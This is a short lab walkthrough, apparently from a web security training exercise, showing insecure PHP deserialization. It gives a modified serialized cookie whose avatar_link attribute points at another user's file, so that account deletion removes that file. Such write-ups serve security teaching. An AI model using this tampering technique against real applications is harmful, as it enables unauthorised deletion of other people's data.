## Solution :

Login using the credentials provided - `wiener:peter`.

In the my-account page, we see that there is a **Delete Account option**

We have a PHP serialized cookie where the **User** object attribute called **avatar_link** which points to `users/wiener/avatar`. When we click delete account button, the application takes the data from the serialized cookie & deletes the user account.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bazx6dstvo4vawcwju7km2zg0q6zxzcb";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

If we modify the `avatar_link` attribute & point to to any other file on the server, we could potentially delete that file when the user account gets deleted.

For solving the lab, change the avatar_link attribute to `users/carlos/morale.txt` & update the string length accordingly.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bazx6dstvo4vawcwju7km2zg0q6zxzcb";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}
```
